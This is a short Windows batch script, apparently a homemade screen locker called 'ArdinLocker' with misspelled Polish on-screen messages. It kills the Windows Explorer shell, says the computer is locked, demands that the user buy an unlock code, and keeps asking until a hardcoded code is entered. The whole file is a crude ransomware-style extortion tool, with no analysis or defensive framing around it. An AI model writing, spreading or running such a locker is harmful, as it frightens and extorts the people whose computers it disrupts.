@echo off
taskkill /f /im explorer.exe
cls
echo twuj komputer zostal zablokowany przez ArdinLocker
echo rzeby go odblokowac musisz kupic kod odblokowujoncy
set code=""

:code
set /p code="Wpisz kod:"
if "%code%"=="F7H!RAFAAQPSRALIDALSHECHEMVIDILI" goto correct
if NOT "%code%"=="F7H!RAFAAQPSRALIDALSHECHEMVIDILI" goto wrong

:correct
start explorer
echo Kod prawidlowy
pause
exit

:wrong
echo Kod nieprawidlowy, sprubuj jeszcze raz
goto code
